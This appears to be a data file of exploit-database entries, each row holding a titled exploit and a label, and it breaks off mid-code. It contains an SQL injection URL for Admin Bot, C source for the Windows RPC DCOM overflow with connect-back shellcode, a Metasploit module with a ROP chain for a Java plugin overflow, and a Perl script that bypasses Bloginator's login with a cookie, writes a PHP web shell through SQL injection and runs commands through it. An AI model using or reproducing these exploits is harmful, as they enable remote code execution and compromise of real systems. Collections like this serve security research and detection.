36290,"Admin Bot - 'news.php' SQL Injection source: https://www.securityfocus.com/bid/50562/info  Admin Bot is prone to an SQL Injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.   http://www.example.com/news.php?wgo=666+and+1=2+union+all+select+0,1,BALTAZAR,3,4,5,6,7,8--","[""'news.php'""]",1
64,"Microsoft Windows - 'RPC DCOM' Remote Buffer Overflow #include <stdio.h> #include <winsock2.h> #include <windows.h> #include <process.h> #include <string.h> #include <winbase.h> #pragma  comment(lib,""ws2_32"")  unsigned char bindstr[]={ 0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00, 0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00, 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00, 0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00, 0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};  unsigned char request1[]={ 0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03 ,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00 ,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45 ,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E ,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D ,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41 ,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00 ,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45 ,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00 ,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00 ,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03 ,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00 ,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29 ,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00 ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00 ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00 ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00 ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00 ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00 ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00 ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00 ,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00 ,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10 ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF ,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10 ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09 ,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00 ,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00 ,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00 ,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00 ,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01 ,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03 ,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00 ,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E ,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00 ,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00 ,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00 ,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00 ,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00,0x00,0x00};  unsigned char request2[]={ 0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00 ,0x00,0x00,0x5C,0x00,0x5C,0x00};  unsigned char request3[]={ 0x5C,0x00 ,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00 ,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00 ,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00 ,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};     unsigned int jmpesp_cn_sp3 = ""\x29\x2c\xe2\x77""; unsigned int jmpesp_cn_sp4 = ""\x29\x4c\xdf\x77""; unsigned int jmpesp_en_xp_sp1=""\xdb\x37\xd7\x77"";   unsigned char sc[]=     ""\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00""     ""\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00""     ""\x46\x00\x58\x00\x46\x00\x58\x00""           ""\x29\x4c\xdf\x77""//jmp esp 's address on Windows 2k SP4 Chinese version.     ""\x38\x6e\x16\x76\x0d\x6e\x16\x76""  //should be address which can be written.         //here is SHELLCODE_¿we can use our SHELLCODE_¿but the length must be sizeof(shellcode)%16=12 ,if not please fill with 0x90          //SHELLCODE can't has the code such as 0X00 and 0X5C     ""\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""     ""\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""     ""\x93\x40\xe2\xfa""     // code      ""\x7b\xe4\x93\x93\x93\xd4\xf6\xe7\xc3\xe1\xfc\xf0\xd2\xf7\xf7\xe1""     ""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xdf\xfa\xf1\xe1\xf2\xe1\xea\xd2""     ""\x93\xd0\xe1\xf6\xf2\xe7\xf6\xc3\xe1\xfc\xf0\xf6\xe0\xe0\xd2\x93""     ""\xd0\xff\xfc\xe0\xf6\xdb\xf2\xfd\xf7\xff\xf6\x93\xd6\xeb\xfa\xe7""     ""\xc7\xfb\xe1\xf6\xf2\xf7\x93\xe4\xe0\xa1\xcc\xa0\xa1\x93\xc4\xc0""     ""\xd2\xc0\xe7\xf2\xe1\xe7\xe6\xe3\x93\xc4\xc0\xd2\xc0\xfc\xf0\xf8""     ""\xf6\xe7\xd2\x93\xf0\xff\xfc\xe0\xf6\xe0\xfc\xf0\xf8\xf6\xe7\x93""     ""\xf0\xfc\xfd\xfd\xf6\xf0\xe7\x93\xf0\xfe\xf7\x93\xc9\xc1\x28\x93""     ""\x93\x63\xe4\x12\xa8\xde\xc9\x03\x93\xe7\x90\xd8\x78\x66\x18\xe0""     ""\xaf\x90\x60\x18\xe5\xeb\x90\x60\x18\xed\xb3\x90\x68\x18\xdd\x87""     ""\xc5\xa0\x53\xc4\xc2\x18\xac\x90\x68\x18\x61\xa0\x5a\x22\x9d\x60""     ""\x35\xca\xcc\xe7\x9b\x10\x54\x97\xd3\x71\x7b\x6c\x72\xcd\x18\xc5""     ""\xb7\x90\x40\x42\x73\x90\x51\xa0\x5a\xf5\x18\x9b\x18\xd5\x8f\x90""     ""\x50\x52\x72\x91\x90\x52\x18\x83\x90\x40\xcd\x18\x6d\xa0\x5a\x22""     ""\x97\x7b\x08\x93\x93\x93\x10\x55\x98\xc1\xc5\x6c\xc4\x63\xc9\x18""     ""\x4b\xa0\x5a\x22\x97\x7b\x14\x93\x93\x93\x10\x55\x9b\xc6\xfb\x92""     ""\x92\x93\x93\x6c\xc4\x63\x16\x53\xe6\xe0\xc3\xc3\xc3\xc3\xd3\xc3""     ""\xd3\xc3\x6c\xc4\x67\x10\x6b\x6c\xe7\xf0\x18\x4b\xf5\x54\xd6\x93""     ""\x91\x93\xf5\x54\xd6\x91\x28\x39\x54\xd6\x97\x4e\x5f\x28\x39\xf9""     ""\x83\xc6\xc0\x6c\xc4\x6f\x16\x53\xe6\xd0\xa0\x5a\x22\x82\xc4\x18""     ""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""     ""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""     ""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""     ""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""     ""\x7f\x19\x95\xd5\x17\x53\xe6\x6a\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""     ""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"";  unsigned char request4[]={ 0x01,0x10 ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00 ,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C ,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };  void main(int argc,char ** argv) {     WSADATA WSAData;     SOCKET sock;     int len,len1;     SOCKADDR_IN addr_in;     short port=135;     unsigned char buf1[0x1000];     unsigned char buf2[0x1000];     unsigned short port1;     DWORD cb;          printf(""RPC DCOM overflow Vulnerability discoveried by LSD\n"");     printf(""Code by FlashSky,Flashsky@xfocus.org,benjurry,benjurry@xfocus.org\n"");     printf(""Welcome to our English Site: http://www.xfocus.org\n"");     printf(""Welcome to our Chinese Site: http://www.xfocus.net\n"");   if(argc<5) {   printf(""useage:%s targetip localIP LocalPort SPVersion\n"",argv[0]);    printf(""SPVersion:\n0 w2k Chinese version +sp3\n 1 w2k Chinese version +SP4\n 2 winxp English version +sp1\n""); exit(1); }   if(atoi(argv[4])==0) memcpy(sc+36,jmpesp_cn_sp3,sizeof(jmpesp_cn_sp3)); else if (atoi(argv[4])==1) memcpy(sc+36,jmpesp_cn_sp4,sizeof(jmpesp_cn_sp4)); else if (atoi(argv[4])==2) memcpy(sc+36,jmpesp_en_xp_sp1,sizeof(jmpesp_en_xp_sp1));       if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)     {         printf(""WSAStartup error.Error:%d\n"",WSAGetLastError());         return;     }      addr_in.sin_family=AF_INET;     addr_in.sin_port=htons(port);     addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);          if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)     {         printf(""Socket failed.Error:%d\n"",WSAGetLastError());         return;     }     if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)     {         printf(""Connect failed.Error:%d"",WSAGetLastError());         return;     }     port1 = htons(atoi(argv[3]));       port1 ^= 0x9393;     cb=inet_addr(argv[2]);     cb ^= 0x93939393;     *(unsigned short *)&sc[330+0x30] = port1;     *(unsigned int *)&sc[335+0x30] = cb;     len=sizeof(sc);     memcpy(buf2,request1,sizeof(request1));     len1=sizeof(request1);     *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;       *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;     memcpy(buf2+len1,request2,sizeof(request2));     len1=len1+sizeof(request2);     memcpy(buf2+len1,sc,sizeof(sc));     len1=len1+sizeof(sc);     memcpy(buf2+len1,request3,sizeof(request3));     len1=len1+sizeof(request3);     memcpy(buf2+len1,request4,sizeof(request4));     len1=len1+sizeof(request4);     *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;      *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;       *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;     *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;     *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;     *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;     *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;     *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;     if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)     {             printf(""Send failed.Error:%d\n"",WSAGetLastError());             return;     }          len=recv(sock,buf1,1000,NULL);     if (send(sock,buf2,len1,0)==SOCKET_ERROR)     {             printf(""Send failed.Error:%d\n"",WSAGetLastError());             return;     }     len=recv(sock,buf1,1024,NULL); }  // milw0rm.com [2003-07-25]","[""'RPC DCOM'""]",1
16587,"Sun Java - Runtime New Plugin docbase Buffer Overflow (Metasploit) ## # $Id: java_docbase_bof.rb 11513 2011-01-08 00:25:44Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	# 	# This module acts as an HTTP server 	# 	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Sun Java Runtime New Plugin docbase Buffer Overflow', 			'Description'    => %q{ 					This module exploits a flaw in the new plugin component of the Sun Java 				Runtime Environment before v6 Update 22. By specifying specific parameters 				to the new plugin, an attacker can cause a stack-based buffer overflow and 				execute arbitrary code.  				When the new plugin is invoked with a ""launchjnlp"" parameter, it will 				copy the contents of the ""docbase"" parameter to a stack-buffer using the 				""sprintf"" function. A string of 396 bytes is enough to overflow the 256 				byte stack buffer and overwrite some local variables as well as the saved 				return address.  				NOTE: The string being copied is first passed through the ""WideCharToMultiByte"". 				Due to this, only characters which have a valid localized multibyte 				representation are allowed. Invalid characters will be replaced with 				question marks ('?').  				This vulnerability was originally discovered independently by both Stephen 				Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't 				been done, all versions since version 6 Update 10 are believed to be affected 				by this vulnerability.  				This vulnerability was patched as part of the October 2010 Oracle Patch 				release. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 'jduck', 			'Version'        => '$Revision: 11513 $', 			'References'     => 				[ 					[ 'CVE', '2010-3552' ], 					[ 'OSVDB', '68873' ], 					[ 'BID', '44023' ], 					[ 'URL', 'http://blog.harmonysecurity.com/2010/10/oracle-java-ie-browser-plugin-stack.html' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-206/' ], 					[ 'URL', 'http://code.google.com/p/skylined/issues/detail?id=23' ], 					[ 'URL', 'http://skypher.com/index.php/2010/10/13/issue-2-oracle-java-object-launchjnlp-docbase/' ], 					[ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpuoct2010-176258.html' ], 				], 			'Platform'       => 'win', 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 					'InitialAutoRunScript' => 'migrate -f', 				}, 			'Payload'        => 				{ 					'Space'    => 1024, 					# The double quote is due to the html, the rest due to utf8 conversion crap. 					'BadChars' => ""\x00\x22"" + (0x80..0x9f).to_a.pack('C*'), 					'DisableNops' => true, 					#'EncoderType'    => Msf::Encoder::Type::AlphanumMixed, 					'EncoderOptions' => 						{ 							'BufferRegister' => 'EAX', 						} 				}, 			'Targets'        => 				[ 					# Tested OK on: 					# JRE 6u21 on XPSP3 and Win7-RTM 					# JRE 6u18 on XPSP3 (ugly dialog on IE8) 					# JRE 6u11 on XPSP3 (ugly dialog on IE8) 					[ 'Windows Universal (msvcr71.dll ROP)', { } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Oct 12 2010' 			)) 	end  	def on_request_uri(cli, request)  		return if ((p = regenerate_payload(cli)) == nil)  		print_status(""Sending exploit HTML to #{cli.peerhost}:#{cli.peerport}"")  		# ActiveX params 		clsid = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA' 		var_obj = rand_text_alpha(8+rand(8))   		# These addresses are from the bundled msvcr71.dll from JRE 6u21 =begin 7c340000 7c396000   MSVCR71    (export symbols)       C:\Program Files\Java\jre6\bin\MSVCR71.dll Loaded symbol image file: C:\Program Files\Java\jre6\bin\MSVCR71.dll Image path: C:\Program Files\Java\jre6\bin\MSVCR71.dll Image name: MSVCR71.dll Timestamp:        Fri Feb 21 07:42:20 2003 (3E561EAC) CheckSum:         0005F1E9 ImageSize:        00056000 File version:     7.10.3052.4 Product version:  7.10.3052.4 =end  		base = 0x7c340000 		rva = { 			'scratch'     => 0x4b170, # Scratch space.. 			'scratch2'    => 0x4b170 - 0x10, # Scratch space.. 			'import_VA'   => 0x3a08c - 0x58, # The import address of HeapCreate (less 0x58, avoid badchars) 			'add_58_eax'  => 0xd05e,  # add eax, 0x58 / ret 			'pop_eax'     => 0x4cc1,  # pop eax / ret 			'deref_eax'   => 0x130ea, # mov eax, [eax] / ret 			'deref_eax4'  => 0xe72b,  # mov eax, [eax+4] / ret 			'jmp_eax'     => 0x13ac,  # push eax / ret 			'jmp_ecx'     => 0x6b0e,  # jmp ecx 			'pop_edx'     => 0x5937,  # pop edx / ret 			'adjust_eax'  => 0x32ef8, # add eax, 0x80bf / add dh, dh / ret 			'rep_movsd'   => 0x363f,  # rep movsd / pop edi / pop esi / sub eax, eax / ret 			'esp_to_esi'  => 0x32f4f, # push esp / and al, 0x10 / mov [edx], ecx / pop esi / ret 			'switcheroo'  => 0x3427,  # mov ecx, eax / mov eax, esi / pop esi / ret 0x10 			'st_eax_ecx'  => 0x103c8, # mov [ecx], eax / ret 			'xor_ecx'     => 0x1aa5f, # xor ecx, ecx / mov [eax+0xc], ecx / ret 4 			'set_ecx_fd'  => 0x1690b, # mov cl, 0xfe / dec ecx / ret 		}  		extra_insn = 'nop' 		#extra_insn = 'int 3' 		single_op = Metasm::Shellcode.assemble(Metasm::Ia32.new, <<-EOS).encode_string 	#{extra_insn} 	push ecx 	pop edi 	ret EOS  		# This is the ROP stack. 		stack = [ 			# Load HeapCreate addr from IAT 			'pop_eax', 			0x41414141,     # unused space.. 			0x41414141, 			0x41414141, 			0x41414141, 			'import_VA',    # becomes eax 			'add_58_eax', 			'deref_eax',  			# call HeapCreate 			'jmp_eax', 			'adjust_eax',   # eip after HeapCreate 			0x01040110,     # flOptions (gets & with 0x40005) 			0x01010101,     # dwInitialSize 			0x01010101,     # dwMaximumSize  			# Move esp into esi 			'pop_edx', 			'scratch',      # becomes edx 			'esp_to_esi',  			# Store a single-dword stub to our buffer 			'switcheroo', 			single_op.unpack('V').first,  # becomes esi/eax 			'deref_eax4', 			0x41414141,     # more unused space.. 			0x41414141, 			0x41414141, 			0x41414141, 			'st_eax_ecx', 			 			# Call our dword-stub 			'jmp_ecx',  			# Re-load ESP and save our Heap address to scratch (edx) 			'esp_to_esi',  			# Set ecx to something sane (for memcpy) 			'pop_eax', 			'scratch2', 			'xor_ecx', 			'set_ecx_fd', 			0x41414141,     # skipped by ret 0x4  			# Do the memcpy! 			'rep_movsd', 			0x41414141,     # becomes edi 			0x41414141,     # becomes esi  			# Re-load our Heap pointer 			'pop_eax', 			'scratch', 			'deref_eax',  			# Adjust it to skip the non-payload parts 			'add_58_eax', 			 			# Execute it ! 			'jmp_eax',  			# BOOO! 			0x41414141 		]  		# Replace unused entries with randomness 		stack = stack.map { |el| 			if el.kind_of? String 				base + rva[el] 			elsif el == 0x41414141 				rand_text(4).unpack('V').first 			else 				el 			end 		}.pack('V*')   		# Create the overflow buffer 		docbase = rand_text(392) 		docbase << stack 		docbase << rand_text(584 - docbase.length) 		docbase << payload.encoded  		# Generate the html page that will trigger the vuln. 		html = <<-EOS <html> <body>Please wait... <object id=""#{var_obj}"" classid=""clsid:#{clsid}"" width=""0"" height=""0""> <PARAM name=""launchjnlp"" value=""1""> <PARAM name=""docbase"" value=""#{docbase}""> </object> <embed type=""application/x-java-applet"" width=""0"" height=""0"" launchjnlp=""1"" docbase=""#{docbase}"" /> </body> </html> EOS  		# Pow. 		send_response_html(cli, html, 			{ 				'Content-Type' => 'text/html', 				'Pragma' => 'no-cache' 			}) 	end  end",['Runtime New'],1
8244,"Bloginator 1a - SQL Injection / Command Injection (via Cookie Bypass ) ##########################################################################  Author = FireShot , Jacopo Vuga. Thx to = Osirys for develop the Exploitation Code with me Mail = fireshot<at>autistici<dot>org / osirys<at>autistici<dot>org  Vulnerability = SQL Command Injection (mq = off) Software = Bloginator V1A Download = http://kamads.com/kamads_ads/download.php?email=bloginator&ID=0  Greets to = Myral, str0ke  ###########################################################################  [CODE]   [URL] www.site.com/bloginator/articleCall.php  global $name,$password,$returnLink; $p_name = strip_tags(substr($_POST['name'],0,32)); $p_password = strip_tags(substr($_POST['password'],0,32)); if(crypt($p_name , $name) == $name and crypt($p_password,$password) == $password ) {            setcookie(""identifyYourself"",""you are identified"");           print ""Login successfull<br>"";           print $returnLink;       }   else {print ""Wrong username or password"";   } } [...] $action = @$_GET['action']; [...] $id = $_GET['id']; [...] function editArticle($id,$message) { global $returnLink; $query = ""select * FROM articles WHERE id='$id'""; $sql = mysql_query($query) or die(mysql_query()); $title = mysql_result($sql,0,'title'); $title = htmlentities($title); $article = mysql_result($sql,0,'article'); $article = htmlentities($article); $link = mysql_result($sql,0,'link'); $link = htmlentities($link);  startHTML(""Edit ID # "".$id); ?>  [/CODE]   [EXPLOIT]  #!/usr/bin/perl  use IO::Socket; use LWP::UserAgent;  my $host = $ARGV[0]; my $rand = int(rand 9) +1;  my @error_logs  =  qw(                      /var/log/httpd/error.log                      /var/log/httpd/error_log                      /var/log/apache/error.log                      /var/log/apache/error_log                      /var/log/apache2/error.log                      /var/log/apache2/error_log                      /logs/error.log                      /var/log/apache/error_log                      /var/log/apache/error.log                      /usr/local/apache/logs/error_log                      /etc/httpd/logs/error_log                      /etc/httpd/logs/error.log                      /var/www/logs/error_log                      /var/www/logs/error.log                      /usr/local/apache/logs/error.log                      /var/log/error_log                      /apache/logs/error.log                    );  my $php_c0de   =  ""<?php echo \""st4rt\"";system(\$_GET[cmd]);?>"";  ($host) || help(""-1""); cheek($host) == 1 || help(""-2""); &banner;  $datas = get_input($host); $datas =~ /(.*) (.*)/; ($h0st,$path) = ($1,$2);   print ""[*] Generating error through GET request ..\n"";  get_req($host.""/osirys_log_test"".$rand);  print ""[*] Cheeking Apache Error Log path ..\n"";  while (($log = <@error_logs>)&&($gotcha != 1)) {    my $regexp = ""File does not exist: (.+)\/osirys_log_test$rand"";    my $sql_load_file = ""/articleCall.php?action=edit&id=osirys' union select 1,2,3,4,load_file('"".$log.""'),6,7 order by '*"";    $re = sql_socket($sql_load_file,$regexp,""1"");    if ($re !~ /Failed/) {        $site_path = $re;        $ok = 1;    }    if ($ok == 1) {        print ""[*] Error Log path found -> $log\n"";        print ""[*] Website path found -> $site_path\n"";        &inj_shell;    }    else {        print ""[-] Couldn't file error_log !\n"";    } }  sub inj_shell {    my $attack  = ""/articleCall.php?action=edit&id=osirys' union select 1,2,3,4,'"".$php_c0de.""',6,7 into outfile '"".$site_path.""/1337.php"";    my $regexp  = ""st4rt"";    my $re = sql_socket($attack,$regexp,""2"");    if ($re == 1) {        print ""[*] Shell succesfully injected !\n"";        print ""[&] Hi my master, do your job now [!]\n\n"";        $exec_path = $host.""/1337.php"";        &exec_cmd;     }    else {        print ""[-] Shell not found \n[-] Exploit failed\n\n"";        exit(0);    } }  sub exec_cmd {    $h0st !~ /www\./ || $h0st =~ s/www\.//;    print ""shell[$h0st]\$> "";    $cmd = <STDIN>;    $cmd !~ /exit/ || die ""[-] Quitting ..\n"";    my $exec_path_ = $exec_path.""?cmd="".$cmd;    my $re = get_req($exec_path_);    my $content = tag($re);    if ($content =~ /st4rt(.+)\*\*6/) {        my $out = $1;        $out =~ s/\$/ /g;        $out =~ s/\*/\n/g;        chomp($out);        print ""$out\n"";        &exec_cmd;    }    else {        $c++;        $cmd =~ s/\n//;        print ""bash: "".$cmd."": command not found\n"";        $c < 3 || die ""[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n"";        &exec_cmd;    } }  sub sql_socket() {     my($sql,$regexp,$way) = @_;    $sql = tag_encode($sql);     my $url = $path.""/"".$sql;     my $data = ""GET "".$url."" HTTP/1.1\r\n"".               ""Host: "".$h0st.""\r\n"".               ""Keep-Alive: 300\r\n"".               ""Connection: keep-alive\r\n"".               ""Content-Type: application/x-www-form-urlencoded\r\n"".               ""Cookie: identifyYourself=you+are+identified;\r\n"".               ""Content-Length: 0\r\n\r\n"".               ""\r\n"";     my $socket   =  new IO::Socket::INET(                                             PeerAddr 